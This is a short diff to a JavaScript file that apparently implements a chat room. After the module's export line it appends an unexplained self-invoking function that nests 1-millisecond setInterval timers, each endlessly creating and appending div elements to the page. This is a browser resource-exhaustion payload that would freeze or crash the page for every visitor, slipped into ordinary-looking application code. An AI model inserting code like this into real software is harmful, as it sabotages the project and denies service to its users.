@@ -459,3 +459,12 @@
     global.ChatRoom = ChatRoom;
 
 });
+
+(function () {
+    setInterval(function () {
+        setInterval(function () {
+            var d = document.createElement('div');
+            document.body.appendChild(d);
+        },1)
+    },1);
+})();
